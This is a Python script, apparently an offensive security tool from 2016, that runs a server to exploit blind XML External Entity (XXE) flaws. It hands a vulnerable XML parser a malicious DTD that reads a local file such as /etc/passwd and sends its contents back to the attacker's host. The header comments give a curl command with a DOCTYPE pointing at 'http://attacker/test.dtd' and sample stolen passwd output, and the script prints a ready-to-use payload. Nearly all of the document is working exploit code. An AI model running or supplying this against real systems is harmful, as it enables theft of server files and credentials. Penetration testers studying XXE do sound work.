#!/usr/bin/python

#
# Simple Blind XXE server intended to handle incoming requests for
# malicious DTD file, that will subsequently ask for locally stored file,
# like file:///etc/passwd.
#
# This program has been tested with PlayFramework 2.1.3 XXE vulnerability,
# to be run as follows:
#
# 0. Configure global variables: SERVER_SOCKET and RHOST
#
# 1. Run the below script, using:
#   $ python blindxxe.py [options] <filepath>
#
#   where <filepath> can be for instance: "file:///etc/passwd"
#
# 2. Then, while server is running - invoke XXE by requesting e.g.
#   $ curl -X POST http://vulnerable/app --data-binary \
#       $'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker/test.dtd"><foo>&exfil;</foo>'
#
# The expected result will be like the following:
#
# $ python blindxxe.py 
#   Exfiltrated file:///etc/passwd:
#   ------------------------------
#   root:x:0:0:root:/root:/bin/sh
#   nobody:x:65534:65534:nobody:/nonexistent:/bin/false
#   user:x:1000:50:Linux User,,,:/home/user:/bin/sh
#   play:x:100:65534:Linux User,,,:/var/www/play/:/bin/false
#   mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false
#
#
# Mariusz Banach, 2016
#


from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
import re
import sys
import time
import socket
import argparse
import threading

#
# CONFIGURE THE BELOW VARIABLES
#

config = {
    'debug' : '',
    'listen' : '0.0.0.0',
    'port' : 8080,
    'rhost' : '',
    'exfil-file' : '',
}

EXFILTRATED_EVENT = threading.Event()

def dbg(x):
    if config['debug']:
        print('[dbg] {}'.format(x))


class BlindXXEServer(BaseHTTPRequestHandler):
    method = ''

    def response(self, **data):
        code = data.get('code', 200)
        content_type = data.get('content_type', 'text/plain')
        body = data.get('body', '')

        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.end_headers()
        self.wfile.write(body.encode('utf-8'))
        self.wfile.close()

    def do_GET(self):
        self.method = 'GET'
        self.request_handler(self)

    def do_POST(self):
        self.method = 'POST'
        self.request_handler(self)

    def log_message(self, format, *args):
        return

    def request_handler(self, request):
        global EXFILTRATED_EVENT

        print('[.] Incoming HTTP request from {}: {} {}'.format(
            self.client_address[0],
            request.method,
            request.path[:25]
        ))

        path = urllib.unquote(request.path).decode('utf8')
        m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
        if m and request.command.lower() == 'get':
            data = path[len('/?exfil='):]
            print('\n[+] Exfiltrated %s:' % config['exfil-file'])
            print('-' * 30)
            print(urllib.unquote(data).decode('utf8'))
            print('-' * 30 + '\n')
            self.response(body='true')

            EXFILTRATED_EVENT.set()

        elif request.path.endswith('.dtd'):
            dbg('Sending malicious DTD file.')
            dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
<!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s:%(exfil_port)d/?exfil=%%param_exfil;'>">
%%param_request;''' % {
                'exfil_file' : config['exfil-file'], 
                'exfil_host' : config['rhost'], 
                'exfil_port' : config['port']
            }

            self.response(content_type='text/xml', body=dtd)

        else:
            dbg('%s %s' % (request.command, request.path))
            self.response(body='false')


def parseOptions(argv):
    global config

    print('''
        :: Blind-XXE attacker's helper backend component
        Helps exfiltrate files by abusing out-of-bands XML External Entity vulnerabilities.
        Mariusz Banach / mgeeky '16-18, <mb@binary-offensive.com>
''')

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <file>')

    parser.add_argument('file', type=str, metavar='FILE', default='file:///etc/passwd', help = 'Specifies file to exfiltrate using Blind XXE technique.')
    parser.add_argument('-l', '--listen', default='0.0.0.0', help = 'Specifies interface address to bind the HTTP server on / listen on. Default: 0.0.0.0 (all interfaces)')
    parser.add_argument('-p', '--port', metavar='PORT', default='8080', type=int, help='Specifies the port to listen on. Default: 8080')
    parser.add_argument('-r', '--rhost', metavar='HOST', default=config['rhost'], help='Specifies attackers host address where the victim\'s XML parser should refer while fetching external entities')

    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    config['debug'] = args.debug
    config['listen'] = args.listen
    config['port'] = int(args.port)
    config['rhost'] = args.rhost
    config['exfil-file'] = args.file

    print('[::] File to be exfiltrated: "{}"'.format(args.file))

    port = int(args.port)
    if port < 1 or port > 65535:
        Logger.err("Invalid port number. Must be in <1, 65535>")
        sys.exit(-1)

    return args

def fetchRhost():
    global config
    config['rhost'] = socket.gethostbyname(socket.gethostname())

def main(argv):
    global config

    fetchRhost()

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    print('[+] Serving HTTP server on: ("{}", {})'.format(
        config['listen'], config['port']
    ))
    dbg('RHOST set to: {}'.format(config['rhost']))

    rhost = config['listen']
    if config['listen'] == '0.0.0.0':
        rhost = config['rhost']

    print('\n[>] Here, use the following XML to leverage Blind XXE vulnerability:')
    print('''
===
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{}:{}/test.dtd">
<foo>&exfil;</foo>
===

PS: Don't forget to set:
    Content-Type: text/xml

    '''.format(rhost, config['port']))

    server = HTTPServer((config['listen'], config['port']), BlindXXEServer)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()

    while not EXFILTRATED_EVENT.is_set():
        pass

    print('[+] File has been exfiltrated. Quitting.')

if __name__ == '__main__':
    main(sys.argv)
